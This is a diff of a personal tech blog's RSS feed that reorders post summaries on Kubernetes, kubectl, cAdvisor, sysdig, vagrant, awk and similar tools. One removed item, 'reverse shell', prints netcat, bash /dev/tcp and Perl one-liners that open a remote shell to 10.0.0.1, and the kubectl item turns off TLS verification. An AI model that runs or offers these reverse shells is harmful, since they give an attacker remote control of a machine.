-# curl -k -N -X GET -H &amp;quot;Authorization: Basic XXXXXXXXXX&amp;quot; http://localhost:8080/api/v1/namespaces/default/pods { &amp;quot;kind&amp;quot;: &amp;quot;PodList&amp;quot;, &amp;quot;apiVersion&amp;quot;: &amp;quot;v1&amp;quot;, &amp;quot;metadata&amp;quot;: { &amp;quot;selfLink&amp;quot;: &amp;quot;/api/v1/namespaces/default/pods&amp;quot;, &amp;quot;resourceVersion&amp;quot;: &amp;quot;74034&amp;quot; }, &amp;quot;items&amp;quot;: [] }  Nothing blocks this request! What is wrong? Wait a moment and checkout kubernetes documentation, I find this:
- The Kubernetes API is served by the Kubernetes apiserver process.</description>
+# curl -k -N -X GET -H &amp;quot;Authorization: Basic XXXXXXXXXX&amp;quot; http://localhost:8080/api/v1/namespaces/default/pods { &amp;quot;kind&amp;quot;: &amp;quot;PodList&amp;quot;, &amp;quot;apiVersion&amp;quot;: &amp;quot;v1&amp;quot;, &amp;quot;metadata&amp;quot;: { &amp;quot;selfLink&amp;quot;: &amp;quot;/api/v1/namespaces/default/pods&amp;quot;, &amp;quot;resourceVersion&amp;quot;: &amp;quot;74034&amp;quot; }, &amp;quot;items&amp;quot;: [] } Nothing blocks this request! What is wrong? Wait a moment and checkout kubernetes documentation, I find this:
+ The Kubernetes API is served by the Kubernetes apiserver process. Typically, there is one of these running on a single kubernetes-master node.</description>
     </item>
     
     <item>
@@ -857,6 +975,17 @@ Specifically Designed to Run Containers Red Hat Enterprise Linux 7 Atomic Host B
       
       <guid>https://feisky.xyz/posts/2015-06-25-stateless-floating-ips/</guid>
       <description>Neutron里面的Floating IPs目前是基于iptables NAT来实现的，它使用ip_conntrack来跟踪所有连接（五元组），</description>
+    </item>
+    
+    <item>
+      <title>sysdig</title>
+      <link>https://feisky.xyz/posts/2015-06-24-sysdig/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://feisky.xyz/posts/2015-06-24-sysdig/</guid>
+      <description>Sysdig captures system calls and other system level events using a linux kernel facility called tracepoints, providing a rich set of real-time, system-level information.
+Sysdig &amp;ldquo;packetizes&amp;rdquo; this information, so that you can do things like save it into trace files and easily filter it, a bit like you would do with tcpdump. This makes it very flexible to explore what processes are doing.
+Sysdig instruments your physical and virtual machines at the OS level by installing into the Linux kernel and capturing system calls and other OS events.</description>
     </item>
     
     <item>
@@ -876,7 +1005,7 @@ Specifically Designed to Run Containers Red Hat Enterprise Linux 7 Atomic Host B
       <guid>https://feisky.xyz/posts/2015-11-04-use-kubectl-to-connect-kubernetes-cluster/</guid>
       <description>kubectl is the main tool to interact with Kubernetes cluster. It connects to http://localhost:8080 with no auth by default. But how can we use kubectl with auth?
 Pretty simple, just config kubectl with dedicated cluster:
-kubectl config set-credentials default --username=username --password=password kubectl config set-cluster default --server=https://kubernetes-master:6443 --insecure-skip-tls-verify=true kubectl config set-context default --cluster=default --user=default kubectl config use-context default  </description>
+kubectl config set-credentials default --username=username --password=password kubectl config set-cluster default --server=https://kubernetes-master:6443 --insecure-skip-tls-verify=true kubectl config set-context default --cluster=default --user=default kubectl config use-context default </description>
     </item>
     
     <item>
@@ -887,6 +1016,15 @@ kubectl config set-credentials default --username=username --password=password k
       <guid>https://feisky.xyz/posts/2015-03-13-usging-cadvisor-to-monitor-docker/</guid>
       <description>cAdvisor (Container Advisor) provides container users an understanding of the resource usage and performance characteristics of their running containers. It is a running daemon that collects, aggregates, processes, and exports information about running containers. Specifically, for each container it keeps resource isolation parameters, historical resource usage, histograms of complete historical resource usage and network statistics. This data is exported by container and machine-wide.
 cAdvisor has native support for Docker containers and should support just about any other container type out of the box.</description>
+    </item>
+    
+    <item>
+      <title>vagrant</title>
+      <link>https://feisky.xyz/posts/2015-01-27-vagrant/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://feisky.xyz/posts/2015-01-27-vagrant/</guid>
+      <description>简易虚拟机管理工具vagrant Vagrant简介 Vagrant是一款跨平台的虚拟机管理工具，可以用来封装跨平台的开发环境，分发给团队成员共</description>
     </item>
     
     <item>
@@ -905,104 +1043,6 @@ cAdvisor has native support for Docker containers and should support just about 
       
       <guid>https://feisky.xyz/posts/2015-06-24-weekly-reading-list-20150626/</guid>
       <description>这周最热的就是Dockercon了，列表里面很多都是docker相关的。 Open Container Project (OCP) Today we’re pleased to announce that CoreOS, Docker, and a large group of industry leaders are working together on a standard container format through the formation</description>
-    </item>
-    
-    <item>
-      <title>awesome quick start</title>
-      <link>https://feisky.xyz/posts/2015-03-20-awesome-quick-start/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>https://feisky.xyz/posts/2015-03-20-awesome-quick-start/</guid>
-      <description>awesome是Linux平台出色的窗口管理器，具有速度快、界面简捷等优点。其安装也比较简单： sudo apt-get install -y awesome awesome-extra gnome-settings-daemon nautilus sudo apt-get install -y --no-install-recommends gnome-session mkdir -p ~/.config/awesome 常用快捷键整</description>
-    </item>
-    
-    <item>
-      <title>awk examples</title>
-      <link>https://feisky.xyz/posts/2015-01-28-awk-examples/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>https://feisky.xyz/posts/2015-01-28-awk-examples/</guid>
-      <description>precede each line by line number  awk &#39;{print NR, $0}&#39; filename   replace first field by line number  awk &#39;{$1=NR; print}&#39; filename   print field 1 and field 2  awk &#39;{print $1,$2}&#39; fielname   print last field  awk &#39;{print $NF}&#39; filename   print non empty lines  awk &#39;NF&amp;gt;0{print $0}&#39; filename   print if more than 4 fields  awk &#39;NF&amp;gt;4{print $0}&#39; filename   print matching lines (egrep)  awk &#39;/test.</description>
-    </item>
-    
-    <item>
-      <title>bigdata</title>
-      <link>https://feisky.xyz/posts/2015-01-27-bigdata/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>https://feisky.xyz/posts/2015-01-27-bigdata/</guid>
-      <description>Awesome Big Data A curated list of awesome big data frameworks, resources and other awesomeness. Inspired by awesome-php, awesome-python, awesome-ruby, hadoopecosystemtable &amp;amp; big-data.
-Your contributions are always welcome!
- Awesome Big Data  Frameworks Distributed Programming Distributed Filesystem Key-Map Data Model Document Data Model Key-value Data Model Graph Data Model NewSQL Databases Columnar Databases Time-Series Databases SQL-like processing Integrated Development Environments Data Ingestion Service Programming Scheduling Machine Learning Benchmarking Security System Deployment Applications Search engine and framework MySQL forks and evolutions PostgreSQL forks and evolutions Memcached forks and evolutions Embedded Databases Business Intelligence Data Visualization Internet of things and sensor data Interesting Readings Interesting Papers  Other Awesome Lists  Frameworks  Apache Hadoop - framework for distributed processing.</description>
-    </item>
-    
-    <item>
-      <title>cannot change locale</title>
-      <link>https://feisky.xyz/posts/2015-02-10-cannot-change-locale/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>https://feisky.xyz/posts/2015-02-10-cannot-change-locale/</guid>
-      <description>运行locale命令 LANG= LANGUAGE= LC_CTYPE=&amp;ldquo;POSIX&amp;rdquo; LC_NUMERIC=&amp;ldquo;POSIX&amp;rdquo; LC_TIME=&amp;ldquo;POSIX&amp;rdquo; LC_COLLATE=&amp;ldquo;POSIX&amp;rdquo; LC_MONETARY=&amp;ldquo;POSIX&amp;rdquo; LC_MESSAGES=&amp;ldquo;POSIX&amp;rdquo; LC_PAPER=&amp;ldquo;POSIX&amp;rdquo; LC_NAME=&amp;ldquo;POSIX&amp;rdquo; LC_ADDRESS=&amp;ldquo;POSIX&amp;rdquo; LC_TELEPHONE=&amp;ldquo;POSIX&amp;rdquo; LC_MEASUREMENT=&amp;ldquo;POSIX&amp;rdquo; LC_IDENTIFICATION=&amp;ldquo;POSIX&amp;rdquo; LC_ALL= 修改profile vi /etc/profile 添加如下内容 export LC_ALL=en_US.UTF-8 source /etc/profile 得到错误 setlocale: LC_ALL: cannot change locale (en_US.UTF-8): No such file or directory &amp;nbsp;运行 dpkg-reconfigure</description>
-    </item>
-    
-    <item>
-      <title>docker in tencent</title>
-      <link>https://feisky.xyz/posts/2015-03-20-docker-in-tencent/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>https://feisky.xyz/posts/2015-03-20-docker-in-tencent/</guid>
-      <description>腾讯内部对Docker有着广泛的使用，其基于Yarn的代号为Gaia的调度平台可以同时兼容Docker和非Docker类型的应用，并提供高并</description>
-    </item>
-    
-    <item>
-      <title>docker internal</title>
-      <link>https://feisky.xyz/posts/2015-01-27-docker-internal/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>https://feisky.xyz/posts/2015-01-27-docker-internal/</guid>
-      <description>docker-baseAbstract 本文在现有文档的基础上总结了以下几点内容 docker的介绍，包括由来、适用场景等 docker背后的一系列技术 - namespace, cgroup, lxc, aufs等 docker</description>
-    </item>
-    
-    <item>
-      <title>git commit修改前一次提交的方法</title>
-      <link>https://feisky.xyz/posts/2015-06-05-git-commit/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>https://feisky.xyz/posts/2015-06-05-git-commit/</guid>
-      <description>方法一：用–amend选项 #修改需要修改的地方。 git add . git commit –amend 注：这种方式可以比较方便的保持原有的Change-Id，推荐使用。 方法</description>
-    </item>
-    
-    <item>
-      <title>reverse shell</title>
-      <link>https://feisky.xyz/posts/2015-01-28-reverse-shell/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>https://feisky.xyz/posts/2015-01-28-reverse-shell/</guid>
-      <description>Listen for 8080 first  nc -l -p 8080 -vvv  Bash Some versions of bash can send you a reverse shell (this was tested on Ubuntu 10.10):
- bash -i &amp; /dev/tcp/10.0.0.1/8080 0&amp;1  PERL Here’s a shorter, feature-free version of the perl-reverse-shell:
- perl -e &#39;use Socket;$i=&#34;10.0.0.1&#34;;$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&#34;tcp&#34;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&#34;&amp;S&#34;);open(STDOUT,&#34;&amp;S&#34;);open(STDERR,&#34;&amp;S&#34;);exec(&#34;/bin/sh -i&#34;);};&#39;  There’s also an&amp;nbsp;alternative PERL revere shell here.
-Python This was tested under Linux / Python 2.7:
- python -c &#39;import socket,subprocess,os;s=socket.</description>
-    </item>
-    
-    <item>
-      <title>sysdig</title>
-      <link>https://feisky.xyz/posts/2015-06-24-sysdig/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>https://feisky.xyz/posts/2015-06-24-sysdig/</guid>
-      <description>Sysdig captures system calls and other system level events using a linux kernel facility called tracepoints, providing a rich set of real-time, system-level information.
-Sysdig &amp;ldquo;packetizes&amp;rdquo; this information, so that you can do things like save it into trace files and easily filter it, a bit like you would do with tcpdump. This makes it very flexible to explore what processes are doing.
-Sysdig instruments your physical and virtual machines at the OS level by installing into the Linux kernel and capturing system calls and other OS events.</description>
-    </item>
-    
-    <item>
-      <title>vagrant</title>
-      <link>https://feisky.xyz/posts/2015-01-27-vagrant/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>https://feisky.xyz/posts/2015-01-27-vagrant/</guid>
-      <description>简易虚拟机管理工具vagrant Vagrant简介 Vagrant是一款跨平台的虚拟机管理工具，可以用来封装跨平台的开发环境，分发给团队成员共</description>
     </item>
     
     <item>
